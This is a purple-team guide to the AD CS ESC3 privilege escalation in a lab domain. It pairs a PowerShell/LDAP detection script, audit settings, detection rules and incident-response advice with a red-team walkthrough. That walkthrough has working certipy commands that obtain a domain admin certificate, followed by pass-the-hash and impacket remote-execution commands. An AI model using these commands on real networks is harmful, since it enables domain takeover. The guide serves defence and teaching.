# Table of Contents

1. [ESC3 Vulnerability](#esc3-vulnerability)
2. [Misconfigurations](#misconfigurations) </br>
   2.1. [Misconfiguration Condition](#misconfigurations-condition)</br>
   2.2. [Manual Detection with Powershell and LDAP](#manual-detection-with-powershell-and-ldap)
3. [Red Team Activity](#red-team-activity)
4. [Blue Team Activity](#blue-team-activity)
5. [Mitigations and Best Practices](#mitigations-and-best-practices)
6. [Bonus Section (Disaster Scenarios)](#bonus-section-disaster-scenarios)

## ESC3 Vulnerability
Active Directory Certificate Services (AD CS) ESC3 is a specific vulnerability related to certificate enrollment in AD CS, which allows an attacker to escalate privileges by impersonating another user. ESC3 vulnerable template allow requester(attacker) to request certificate <b>on behalf of</b> other users.
## Misconfigurations
![8](https://github.com/user-attachments/assets/1e7d4a77-201f-44b2-9cc7-2b2f0b498f46)

Unlike ESC1, the requester doesn't have to have the ability to specify subjectAltName (SAN) in the CSR. In other words, msPKI-Certificate-Name doesn't have to be set to flag "CT_FLAG_ENROLEE_SUPPLIES_SUBJECT".
### Misconfigurations Condition

```
IF 
(
    Manager approval is disabled                              // The msPKI-Enrollment-Flag must NOT have the 0x2 bit set

    AND 
    (
        Number of authorized signatures must be 0             // The msPKI-RA-Signature must be 0
        OR 
        msPKI-RA-Signature attribute is NOT present           // The msPKI-RA-Signature attribute must NOT be set (i.e., it doesn't exist)
    )

    AND 
    (
        The template has Certificate Request Agent EKU        // pkiextendedkeyusage = 1.3.6.1.4.1.311.20.2.1
        OR
        The template has Any Purpose EKU                      // pkiextendedkeyusage = 2.5.29.37.0
        OR
        The template has no EKU
    )

    AND
    (
        Authenticated Users can enroll    // IdentityReference is Authenticated Users, ActiveDirectoryRights is ExtendedRight
        OR
        Domain Users can enroll           // IdentityReference is Domain Users, ActiveDirectoryRights is ExtendedRight
        OR
        Everyone can enroll               // IdentityReference is Everyone, ActiveDirectoryRights is ExtendedRight
    ) 
    
)

```

### Manual Detection of ESC3 Vulnerable Templates with Powershell and LDAP

```powershell
$domain = "DC=hogwarts,DC=local"
$Filter1 = '(objectclass=pkicertificatetemplate)' #Ensure that object is certificate
$Filter2 = '(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))' #Ensure that manager approval is disabled

$Filter3_1 = '(msPKI-RA-Signature=0)' # Ensure that 0 signatures required for a cert enrollment.
$Filter3_2 = '(!(msPKI-RA-Signature=*))' #Ensure that this attribute not set (i.e. it does not exist.)
$Filter3 = "(|"+$Filter3_1+$Filter3_2+")"


$Filter4 = "(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))"
# "(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.1)"   # Certificate Request Agent EKU
# "(pkiextendedkeyusage = 2.5.29.37.0)"            # Any Purpose
# "(!(pkiextendedkeyusage=*))"                     # If pkiextendedkeyusage is not set. 

$Filter_LAST = "(&"+$Filter1+$Filter2+$Filter3+$Filter4+ ")"

$possible_certs = Get-ADObject -LDAPFilter $Filter_Last -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$($domain)" -Properties nTSecurityDescriptor | Where-Object { $_.Name -notin @("CA", "SubCA", "OfflineRouter") }
$cert_count = ($possible_certs | Measure-Object).Count

if($cert_count -ne 0)
{
    
    foreach ($cert in $possible_certs) 
    {
        $acl = $cert.nTSecurityDescriptor
        foreach($access in $acl.Access)
        {
            if(($access.IdentityReference -like "*Authenticated Users*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*'))
                {
                    echo "$($cert.Name) Authenticated Users with ExtendedRight and it is vulnerable to ESC3."
                }
            elseif((($access.IdentityReference -like "*Domain Users*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*')))
                {
                    echo "$($cert.Name) Domain Users with ExtendedRight and it is vulnerable to ESC3."
                }
            elseif((($access.IdentityReference -like "*Everyone*") -and ($access.ActiveDirectoryRights -like '*ExtendedRight*')))
                {
                    echo " $($cert.Name) Everyone with ExtendedRight and it is vulnerable to ESC3."
                }

        }
    }
}
else
{
    echo "There is no certificate which is vulnerable to ESC3."
}
```

## Red Team Activity
HOGWARTS\harry.potter is a user with lowest privilege. It is a just a member of Domain Users. <br>
HOGWARTS\severus.snape is a domain admin user. <br>
### Step1-Find vulnerable Certificates Based on the Vulnerable Certificate Template ESC3.
```console
# certipy-ad find -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip "192.168.0.111"  -enabled -vulnerable -debug
```
<b>-enabled</b>    : Ignore disabled templates. <br>
<b>-vulnerable</b> : Show certificate templates that are vulnerable to known attacks or misconfigurations. <br>
<b>-debug</b>      : Provide more detailed information about the command's execution process. <br>

<img src="https://github.com/user-attachments/assets/2c156fbd-97f0-4c4e-a03a-9b8a809af252">

### Step2-Request a Certificate for a Current User

```console
# certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'ESC3_Template' -target CERT01.hogwarts.local
```
<b>-ca</b>         : Specifies CA.<br>
<b>-template</b>   : Specifies template name. <br>
<b>-target</b>     : DNS name of the CA. <br>

<img src="https://github.com/user-attachments/assets/8c90d57e-2b54-473d-8ff3-608de90dafd5">

### Step3-Request a Certificate on Behalf of Domain Admin User

```console
# certipy-ad req -u 'harry.potter@hogwarts.local' -p "Gryffindor1." -dc-ip 192.168.0.111 -ca 'hogwarts-CERT01-CA' -template 'User' -target CERT01.hogwarts.local -pfx harry.potter.pfx -on-behalf-of 'HOGWARTS\severus.snape' -debug
```
<b>-on-behalf-of</b>        : Indicates on whose behalf the certificate is requested (Format: <b>HOGWARTS\severus.snape</b> or <b>severus.snape@hogwarts[.]local</b>)<br>
<b>-pfx</b>   : Specifies  Certificate Request Agent certificate  <br>
<b>-template</b>   : Value is <b>User</b> because we are using User's Certificate Request Agent pfx file.  <br>

<img src="https://github.com/user-attachments/assets/d380b4c1-600a-4419-89a9-dabbf03ebcb6">

### Step4-Use the New Certificate to Authenticate as Domain Admin User

```console
# certipy-ad auth -pfx severus.snape.pfx -dc-ip 192.168.0.111
```
<img src="https://github.com/user-attachments/assets/7c89e70d-01cb-4678-8dc7-3a2b3ae418ab">

### Step5-Further Activities

```console
# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
# crackmapexec smb 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1 -x whoami
# evil-winrm -i 192.168.0.111 -u severus.snape -H 9cdd28ced90e96a6d86ba2f028032bd1
```
If NTLM authentication is disabled 

```console
export KRB5CCNAME=severus.snape.ccache;impacket-psexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k hogwarts.local/severus.snape@DC01.hogwarts.local -debug
export KRB5CCNAME=severus.snape.ccache;impacket-wmiexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k hogwarts.local/severus.snape@DC01.hogwarts.local -debug
export KRB5CCNAME=severus.snape.ccache;impacket-psexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k @DC01.hogwarts.local -debug
export KRB5CCNAME=severus.snape.ccache;impacket-wmiexec -dc-ip 192.168.0.111 -target-ip 192.168.0.111 -no-pass -k @DC01.hogwarts.local -debug
```
> [!NOTE]  
> Be careful when using impacket-psexec. Because this command creates a random 8-character named exe file,which gives the system shell by token impersonating, in the ADMIN$ share. This exe file is considered malicious by AVs and EDRs.


## Blue Team Activity

### Monitoring and Manual Detection Strategy

<b>Enable Audit Certification Services with GPO.</b> </br>
Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Object Access > Audit Certification Services.</br>

<b>Enable Audit Kerberos Authentication Service and Audit Kerberos Service Ticket Operations</b></br>
Computer Configuration > Policies > Windows Settings > Security Settings > Advanced Audit Policy Configuration > Audit Policies > Account Logon</br>

<b>Enable Certificate Authority Auditing</b></br>
certsrv.msc -> Right Click to CA -> Properties -> Auditing -> Select All except "Start Stop Active Directory Certificate Services"

|Server| Event ID | Description |
|---| --- | --- |
| Certificate Server | 4886 | Request for Certificate (Certificate Services received a certificate request.) |
| Certificate Server | 4887 | Certificate Services received a certificate request. |
| Certificate Server | 4888 | Certificate Services denied a certificate request. |
| Certificate Server | 4898 | Certificate Services loaded a certificate. |
| Certificate Server | 4870 | Certificate Services revoked a certificate. |
| Domain Controller | 4768 | A Kerberos authentication ticket (TGT) was requested. |
| Domain Controller | 4769 | A Kerberos service ticket was requested. |


### Monitoring and Detection Strategy of Red Team Activity Step3
<img src="https://github.com/user-attachments/assets/e0e68035-7d5d-49d3-b707-63975cd36428">

**Rule Logic (Pseudocode)** </br>

```
Condition:
   IF Event ID == 4887 
      AND
   IF Extracted_User_From(Requester) != Extracted_User_From(Subject)
Action:
   Generate Alert: "Possible Impersonation Detected: Requester '%(Extracted_User_From(Requester))' requesting certificate for '%(Extracted_User_From(SAN))'"
```

### Monitoring and Detection Strategy of Red Team Activity Step4
<img src="https://github.com/user-attachments/assets/4d3edbd8-5149-4bb1-b9ce-7d571d60b568">

**Rule Logic (Pseudocode)** </br>
**Suggested Action:** Block all types logins of domain administrators from all servers and clients except domain controllers.
```
Condition:
   IF Event ID == 4769 
      AND
   IF Extracted_IP_Address(Event 4769) not in (All Domain Controllers IP List)
Action:
   Generate Alert: "Domain admin user '%(Extracted_TargetUserName(Event 4769)' impersonated from the IP 'Extracted_IP_Address(Event 4769))'"

```
### Sample Alerts of Red Team Activity</br>
Possible Impersonation Detected: Requester **harry.potter** requested a certificate for **severus.snape**</br>
Domain admin user **severus.snape** impersonated from the IP **192.168.0.109**

## Mitigations and Best Practices

* It is recommended to distrupt the [Misconfiguration Condition](#misconfigurations-condition) algorithm.
* Conduct a comprehensive monitoring.
* Disable NTLM authentication and force Kerberos Authentication.
* See https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-misconfigured-enrollment-agent.

## Bonus Section (Disaster Scenarios)

**Q1.** What should you do when you realized that just one domain admin user's TGT already obtained by the attacker?</br>

**A1.** Isolate the certificate server from the domain for a short time and delete all templates(if you dont know which template causes to certificate attack) from the AD CS. After that login to the Domain Controller and delete compromised admin user from domain. This method will also kill all sessions on domain opened from compromised admin user. As a last step remove isolations and reconfigure certificate templates. (Disabling domain admin user will not work.) (Certificate revoking will not work.)(Restarting KDC server will not work.)</br>

**Q2.** What should you do when you realized that all domain admin user's TGT already obtained by the attacker?</br>
**A2.** Isolate the certificate server and domain controllers. Delete all templates(if you dont know which template causes to certificate attack) from the AD CS. Create temporary domain admin user and log in domain controllers with this domain admin user. And delete all domain admin users except temporary one. Remove isolations and reconfigure certificate server and domain admin users.</br>

**Q3.** What should you do if multiple critical users, including domain admins, have had their TGT taken , or if you realize you've had vulnerable certificate templates for a long time and don't want to deal with which users have been compromised?</br>
**A3.** In this scenario isolate the certificate server and domain controllers and delete vulnerable or all templates. Then log in to the domain controller and **reset krbtgt user's password twice**. As a last step remove isolation and reconfigure certificate server. 

> [!CAUTION]  
> Note that this scenario will kill all sessions in the domain for all users, including service accounts in the domain. Although this is the most definitive solution, it may cause service interruptions in the domain afterwards.
